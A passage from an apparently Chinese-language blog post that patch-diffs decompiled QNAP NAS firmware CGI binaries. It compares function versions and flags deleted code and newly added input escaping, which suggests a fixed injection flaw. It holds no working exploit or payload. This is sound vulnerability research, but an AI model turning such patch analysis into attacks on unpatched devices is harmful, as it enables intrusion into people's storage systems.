class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)Get_Private_Profile_Integer(<span class="string">&quot;DISABLE&quot;</span>, <span class="string">&quot;qmultimedia&quot;</span>, <span class="number">0LL</span>, <span class="string">&quot;/var/.application.conf&quot;</span>) == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_410850((<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;QMultimediaEnabled&quot;</span>, <span class="number">0</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;2&quot;</span>, v38, v39, v40);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v41 = Is_Qphoto_Enabled();</span><br><span class="line">      sub_410850((<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;QMultimediaEnabled&quot;</span>, <span class="number">0</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;%d&quot;</span>, v41 != <span class="number">0</span>, v42, v43);</span><br><span class="line">    &#125;</span><br><span class="line">    v44 = Is_MSV2_Supported();</span><br><span class="line">    v45 = v4 != <span class="number">0</span>;</span><br><span class="line">    sub_410850((<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;MSV2Supported&quot;</span>, <span class="number">0</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;%d&quot;</span>, v44 != <span class="number">0</span>, v46, v47);</span><br><span class="line">    v48 = (v45 | v130) != <span class="number">0</span>;</span><br><span class="line">    sub_410850((<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;MSV2WebEnabled&quot;</span>, <span class="number">0</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;%d&quot;</span>, v48, v49, v50);</span><br><span class="line">    sub_410850((<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;MSV2URL&quot;</span>, <span class="number">0</span>, <span class="number">4319261</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;/MSV2/&quot;</span>, v51, v52);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)Get_Private_Profile_Integer(<span class="string">&quot;DISABLE&quot;</span>, <span class="string">&quot;qdownload&quot;</span>, <span class="number">0LL</span>, <span class="string">&quot;/var/.application.conf&quot;</span>) == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_410850((<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;QDownloadEnabled&quot;</span>, <span class="number">0</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;2&quot;</span>, v53, v54, v55);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v56 = Is_Qdownload_Enabled();</span><br><span class="line">      sub_410850((<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;QDownloadEnabled&quot;</span>, <span class="number">0</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;%d&quot;</span>, v56 != <span class="number">0</span>, v57, v58);</span><br><span class="line">    &#125;</span><br><span class="line">    v59 = Is_DSV2_Supported();</span><br><span class="line">    sub_410850((<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;DSV2Supported&quot;</span>, <span class="number">0</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;%d&quot;</span>, v59 != <span class="number">0</span>, v60, v61);</span><br><span class="line">    v62 = Is_DSV3_Supported();</span><br><span class="line">    sub_410850((<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;DSV3Supported&quot;</span>, <span class="number">0</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;%d&quot;</span>, v62 != <span class="number">0</span>, v63, v64);</span><br><span class="line">    sub_410850((<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;DSV2URL&quot;</span>, <span class="number">0</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;%s?ssid=&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;/downloadstation/&quot;</span>, v65, v66);</span><br><span class="line">    v67 = Get_Profile_Boolean(<span class="string">&quot;Index&quot;</span>, <span class="string">&quot;QWeb_LOGO&quot;</span>, <span class="number">1LL</span>);</span><br><span class="line">    sub_410850((<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;QWebEnabled&quot;</span>, <span class="number">0</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;%d&quot;</span>, v45 &amp; v67, v68, v69);</span><br><span class="line">    sub_410850((<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;QWebSSLEnabled&quot;</span>, <span class="number">0</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;%d&quot;</span>, v129 != <span class="number">0</span>, v70, v71);</span><br><span class="line">    sub_410850((<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;QWebSSLPort&quot;</span>, <span class="number">0</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;%d&quot;</span>, Qweb_SSL_Port, v72, v73);</span><br><span class="line">    v74 = Is_Qsurveillance_Enabled();</span><br><span class="line">    sub_410850((<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;NVREnabled&quot;</span>, <span class="number">0</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;%d&quot;</span>, v74 != <span class="number">0</span>, v75, v76);</span><br><span class="line">    sub_410850((<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;NVRURL&quot;</span>, <span class="number">0</span>, <span class="number">4319261</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;/surveillance/&quot;</span>, v77, v78);</span><br><span class="line">    sub_410850((<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;NVRVER&quot;</span>, <span class="number">0</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;%d&quot;</span>, <span class="number">2</span> - (v128 == <span class="number">0</span>), v79, v80);</span><br><span class="line">    v81 = Is_Webfs_Enabled();</span><br><span class="line">    sub_410850((<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;WFM2&quot;</span>, <span class="number">0</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;%d&quot;</span>, v81 != <span class="number">0</span>, v82, v83);</span><br><span class="line">    v84 = Is_WFM_Port_Enabled();</span><br><span class="line">    sub_410850((<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;wfmPortEnabled&quot;</span>, <span class="number">0</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;%d&quot;</span>, v84 != <span class="number">0</span>, v85, v86);</span><br><span class="line">    sub_410850((<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;wfmPort&quot;</span>, <span class="number">0</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;%d&quot;</span>, Web_Access_Port_Ext, v87, v88);</span><br><span class="line">    v89 = Is_WFM_SSL_Enabled();</span><br><span class="line">    sub_410850((<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;wfmSSLEnabled&quot;</span>, <span class="number">0</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;%d&quot;</span>, v89 != <span class="number">0</span>, v90, v91);</span><br><span class="line">    sub_410850((<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;wfmSSLPort&quot;</span>, <span class="number">0</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;%d&quot;</span>, Web_Access_SSL_Port, v92, v93);</span><br><span class="line">    sub_410850((<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;wfmURL&quot;</span>, <span class="number">0</span>, <span class="number">4319261</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;/filestation/&quot;</span>, v94, v95);</span><br><span class="line">    v96 = Is_MusicStation_Enabled();</span><br><span class="line">    v97 = Is_App_Supported(<span class="string">&quot;musics&quot;</span>);</span><br><span class="line">    sub_410850((<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;QMusicsEnabled&quot;</span>, <span class="number">0</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;%d&quot;</span>, v48 &amp; v97 &amp; v96, v98, v99);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">int</span>)Get_MusicStation_URL(dest, <span class="number">257LL</span>) &lt;= <span class="number">0</span> )</span><br><span class="line">      sub_410850((<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;QMusicsURL&quot;</span>, <span class="number">0</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;/musicstation/&quot;</span>, v100, v101, v102);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      sub_410850((<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;QMusicsURL&quot;</span>, <span class="number">0</span>, <span class="number">4319261</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)dest, v101, v102);</span><br><span class="line">    v103 = Is_VideoStation_Enabled();</span><br><span class="line">    v104 = Is_App_Supported(<span class="string">&quot;videos&quot;</span>);</span><br><span class="line">    sub_410850((<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;QVideosEnabled&quot;</span>, <span class="number">0</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;%d&quot;</span>, v48 &amp; v104 &amp; v103, v105, v106);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">int</span>)Get_VideoStation_URL(dest, <span class="number">257LL</span>) &lt;= <span class="number">0</span> )</span><br><span class="line">      sub_410850((<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;QVideosURL&quot;</span>, <span class="number">0</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;/videostation/&quot;</span>, v107, v108, v109);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      sub_410850((<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;QVideosURL&quot;</span>, <span class="number">0</span>, <span class="number">4319261</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)dest, v108, v109);</span><br><span class="line">    v110 = Is_PhotoStation_Enabled();</span><br><span class="line">    v111 = v110 &amp; Is_App_Supported(<span class="string">&quot;photos&quot;</span>);</span><br><span class="line">    LOBYTE(v112) = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)Get_Private_Profile_Boolean(<span class="string">&quot;PhotoStation&quot;</span>, <span class="string">&quot;Enable&quot;</span>, <span class="number">0LL</span>, <span class="string">&quot;/var/.application.conf&quot;</span>) == <span class="number">1</span>;</span><br><span class="line">    sub_410850((<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;QPhotosEnabled&quot;</span>, <span class="number">0</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;%d&quot;</span>, v112 &amp; v111 &amp; v48, v113, v114);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">int</span>)Get_PhotoStation_URL(dest, <span class="number">257LL</span>) &lt;= <span class="number">0</span> )</span><br><span class="line">      sub_410850((<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;QPhotosURL&quot;</span>, <span class="number">0</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;/photostation/&quot;</span>, v115, v116, v117);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      sub_410850((<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;QPhotosURL&quot;</span>, <span class="number">0</span>, <span class="number">4319261</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)dest, v116, v117);</span><br><span class="line">    Available_Disk_Size = Get_Available_Disk_Size(<span class="string">&quot;/mnt/HDA_ROOT&quot;</span>);</span><br><span class="line">    sub_410850((<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;HDAROOT_ALMOST_FULL&quot;</span>, <span class="number">0</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;%d&quot;</span>, Available_Disk_Size &lt;= <span class="number">8</span>, v119, v120);</span><br><span class="line">    Profile_Integer = Get_Profile_Integer(<span class="string">&quot;System&quot;</span>, <span class="string">&quot;Force SSL&quot;</span>, <span class="number">0LL</span>);</span><br><span class="line">    sub_410850((<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;forceSSL&quot;</span>, <span class="number">0</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;%d&quot;</span>, Profile_Integer, v122, v123);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<p>sub_41CA60和sub_41CC60区别，主要增加了一条分支和修改了两处逻辑<br>增加的分支</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v15 )</span><br><span class="line">          &#123;</span><br><span class="line">            v50 = <span class="number">0LL</span>;</span><br><span class="line">            v51 = <span class="number">0LL</span>;</span><br><span class="line">            v52 = <span class="number">0LL</span>;</span><br><span class="line">            v53 = <span class="number">0LL</span>;</span><br><span class="line">            v54 = <span class="number">0</span>;</span><br><span class="line">            *(_QWORD *)nptr = <span class="number">0LL</span>;</span><br><span class="line">            v59 = <span class="number">0LL</span>;</span><br><span class="line">            v60 = <span class="number">0LL</span>;</span><br><span class="line">            v61 = <span class="number">0LL</span>;</span><br><span class="line">            v62 = <span class="number">0</span>;</span><br><span class="line">            sub_412CE0(v17, v16);</span><br><span class="line">            sub_412F40(<span class="number">1LL</span>);</span><br><span class="line">            <span class="keyword">if</span> ( (<span class="keyword">int</span>)Get_Private_Profile_String(<span class="number">4320714LL</span>, <span class="string">&quot;SUID&quot;</span>, <span class="number">4320714LL</span>, &amp;v50, <span class="number">33LL</span>, <span class="string">&quot;/etc/platform.conf&quot;</span>) &lt;= <span class="number">0</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              v50 = <span class="number">0LL</span>;</span><br><span class="line">              v51 = <span class="number">0LL</span>;</span><br><span class="line">              v52 = <span class="number">0LL</span>;</span><br><span class="line">              v53 = <span class="number">0LL</span>;</span><br><span class="line">              v54 = <span class="number">0</span>;</span><br><span class="line">              Get_Device_SUID(&amp;v50, <span class="number">32LL</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( (_BYTE)v50 &amp;&amp; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)Is_Alphabet_Num(&amp;v50) == <span class="number">1</span> )</span><br><span class="line">              sub_410850((<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;SUID&quot;</span>, <span class="number">0</span>, <span class="number">4319261</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;v50, v29, v30);</span><br><span class="line">            Get_Device_CUID(nptr, <span class="number">33LL</span>);</span><br><span class="line">            sub_410850((<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;cuid&quot;</span>, <span class="number">0</span>, <span class="number">4319261</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)nptr, v27, v28);</span><br><span class="line">            <span class="keyword">goto</span> LABEL_44;</span><br><span class="line">          &#125;</span><br></pre></td></tr></table></figure>
+<p>修改的第一处逻辑如图<br><img src="/images/2023-03-29143049.png" alt="avatar"><br>将||修改为&amp;&amp;后，后面那个函数也会执行进而辅助判断<br>修改的第二处逻辑如图<br><img src="/images/2023-03-29143903.png" alt="avatar"><br>sub_40D780和sub_412d30主要区别在于sub_412d30删除了一大段功能(非常可疑)</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(<span class="string">&quot;cgi.cgi&quot;</span>, dest) )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_40D780(Input);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_20;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">//位于main函数中</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="appRequest-cgi"><a href="#appRequest-cgi" class="headerlink" title="appRequest.cgi"></a>appRequest.cgi</h4><p>sub_436337和sub436239函数,sub_436337直接使用snprintf将a1添加到v35中，而修改后的版本先使用escapt_str(a1)然后使用if判断a1<br><img src="/images/2023-03-29151723.png" alt="avatar"><br>sub_435b0b和sub_435839中后面的这个函数增加了个功能如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">stream = (FILE *)xmlReadFile(name, <span class="string">&quot;UTF-8&quot;</span>, <span class="number">97LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_4286CE();</span><br><span class="line">    timer = time(<span class="number">0LL</span>);</span><br><span class="line">    localtime_r(&amp;timer, &amp;tp);</span><br><span class="line">    strftime(v44, <span class="number">0x20</span>uLL, <span class="string">&quot;%Y-%m-%d %T&quot;</span>, &amp;tp);</span><br><span class="line">    v32 = fopen64(<span class="string">&quot;/var/log/wget.log&quot;</span>, <span class="string">&quot;a+&quot;</span>);</span><br><span class="line">    v33 = getpid();</span><br><span class="line">    <span class="built_in">fprintf</span>(v32, <span class="string">&quot;%s(%5d): not valid xml file %s\n&quot;</span>, v44, v33, name);</span><br><span class="line">    fclose(v32);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_53;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( xmlDocGetRootElement(stream) )</span><br><span class="line">  &#123;</span><br><span class="line">    v42 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    sub_4286CE();</span><br><span class="line">    timer = time(<span class="number">0LL</span>);</span><br><span class="line">    localtime_r(&amp;timer, &amp;tp);</span><br><span class="line">    strftime(v44, <span class="number">0x20</span>uLL, <span class="string">&quot;%Y-%m-%d %T&quot;</span>, &amp;tp);</span><br><span class="line">    v41 = fopen64(<span class="string">&quot;/var/log/wget.log&quot;</span>, <span class="string">&quot;a+&quot;</span>);</span><br><span class="line">    v34 = getpid();</span><br><span class="line">    <span class="built_in">fprintf</span>(v41, <span class="string">&quot;%s(%5d): empty xml file %s\n&quot;</span>, v44, v34, name);</span><br><span class="line">    fclose(v41);</span><br><span class="line">    v42 = <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  xmlFreeDoc(stream);</span><br></pre></td></tr></table></figure>
+<p>sub_42702F和sub_41BC0E中，后面的删除了一段功能，删除的功能如下<br>sub_42702f代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_42702F</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  FILE *v0; <span class="comment">// rax</span></span><br><span class="line">  FILE *v1; <span class="comment">// r13</span></span><br><span class="line">  __int64 v2; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">void</span> *v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">void</span> *v4; <span class="comment">// r12</span></span><br><span class="line">  __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  __int64 v6; <span class="comment">// rbx</span></span><br><span class="line">  _DWORD *v7; <span class="comment">// rax</span></span><br><span class="line">  _BOOL4 v8; <span class="comment">// ebp</span></span><br><span class="line">  _DWORD *v9; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v10; <span class="comment">// rax</span></span><br><span class="line">  __int64 v11; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v12; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// r8d</span></span><br><span class="line">  <span class="keyword">int</span> v14; <span class="comment">// r9d</span></span><br><span class="line">  <span class="keyword">char</span> v16[<span class="number">304</span>]; <span class="comment">// [rsp+0h] [rbp-288h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v17[<span class="number">272</span>]; <span class="comment">// [rsp+130h] [rbp-158h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> filename[<span class="number">72</span>]; <span class="comment">// [rsp+240h] [rbp-48h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(filename, <span class="string">&quot;/tmp/.linux_status_XXXXXX&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(v17, <span class="number">0</span>, <span class="number">257</span>);</span><br><span class="line">  <span class="built_in">memset</span>(v16, <span class="number">0</span>, <span class="number">289</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)Is_QPKG_Installed(<span class="string">&quot;container-station&quot;</span>)</span><br><span class="line">    &amp;&amp; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)Is_QPKG_Installed(<span class="string">&quot;ubuntu-hd&quot;</span>)</span><br><span class="line">    &amp;&amp; (Get_Private_Profile_String(<span class="string">&quot;container-station&quot;</span>, <span class="string">&quot;Install_Path&quot;</span>, <span class="string">&quot;&quot;</span>, v17, <span class="number">257LL</span>, <span class="string">&quot;/etc/config/qpkg.conf&quot;</span>),</span><br><span class="line">        <span class="built_in">snprintf</span>(v16, <span class="number">0x121</span>uLL, <span class="string">&quot;%s/bin/qbus&quot;</span>, v17),</span><br><span class="line">        !(<span class="keyword">unsigned</span> <span class="keyword">int</span>)qnap_mktmpname(filename))</span><br><span class="line">    &amp;&amp; !(<span class="keyword">unsigned</span> <span class="keyword">int</span>)qnap_exec(filename, <span class="number">0LL</span>, <span class="number">0LL</span>, v16, <span class="string">&quot;get&quot;</span>, <span class="string">&quot;com.qnap.hd-station/system&quot;</span>, <span class="number">0LL</span>)</span><br><span class="line">    &amp;&amp; (v0 = fopen64(filename, <span class="string">&quot;r&quot;</span>), (v1 = v0) != <span class="number">0LL</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( fseek(v0, <span class="number">0LL</span>, <span class="number">2</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = <span class="number">0LL</span>;</span><br><span class="line">      v4 = <span class="number">0LL</span>;</span><br><span class="line">      v8 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v2 = ftell(v1);</span><br><span class="line">      <span class="keyword">if</span> ( v2 &lt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v6 = <span class="number">0LL</span>;</span><br><span class="line">        v4 = <span class="number">0LL</span>;</span><br><span class="line">        v8 = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( fseek(v1, <span class="number">0LL</span>, <span class="number">0</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        v6 = <span class="number">0LL</span>;</span><br><span class="line">        v4 = <span class="number">0LL</span>;</span><br><span class="line">        v8 = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v3 = <span class="built_in">calloc</span>(<span class="number">1uLL</span>, v2 + <span class="number">1</span>);</span><br><span class="line">        v4 = v3;</span><br><span class="line">        <span class="keyword">if</span> ( v3 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( v2 == fread(v3, <span class="number">1uLL</span>, v2, v1) )</span><br><span class="line">          &#123;</span><br><span class="line">            v5 = json_loads(v4, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">            v6 = v5;</span><br><span class="line">            <span class="keyword">if</span> ( v5 )</span><br><span class="line">            &#123;</span><br><span class="line">              v7 = (_DWORD *)json_object_get(v5, <span class="string">&quot;result&quot;</span>);</span><br><span class="line">              <span class="keyword">if</span> ( v7 )</span><br><span class="line">              &#123;</span><br><span class="line">                v8 = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">if</span> ( !*v7 )</span><br><span class="line">                &#123;</span><br><span class="line">                  v9 = (_DWORD *)json_object_get(v7, <span class="string">&quot;state&quot;</span>);</span><br><span class="line">                  <span class="keyword">if</span> ( v9 )</span><br><span class="line">                  &#123;</span><br><span class="line">                    <span class="keyword">if</span> ( *v9 == <span class="number">2</span> )</span><br><span class="line">                    &#123;</span><br><span class="line">                      v10 = (<span class="keyword">const</span> <span class="keyword">char</span> *)json_string_value(v9);</span><br><span class="line">                      v8 = <span class="built_in">strcmp</span>(<span class="string">&quot;enable&quot;</span>, v10) == <span class="number">0</span>;</span><br><span class="line">                    